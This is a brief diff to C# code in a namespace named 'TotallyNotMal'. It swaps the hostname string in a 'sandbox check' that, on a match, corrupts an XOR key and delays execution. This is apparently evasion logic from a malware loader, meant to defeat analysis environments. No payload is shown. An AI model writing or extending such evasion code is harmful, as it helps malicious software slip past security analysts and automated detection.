@@ -191,7 +191,7 @@ namespace TotallyNotMal
 
             // sandbox check
             string hostName = Environment.GetEnvironmentVariable("COMPUTERNAME");
-            if (hostName.Contains("DESKTOP"))
+            if (hostName.Contains("CHANGESTRINGHERE"))
             {
                 xorKey = xorKey.Remove(0).Insert(0, "~"); //just to be safe
                 System.Threading.Thread.Sleep(5000);
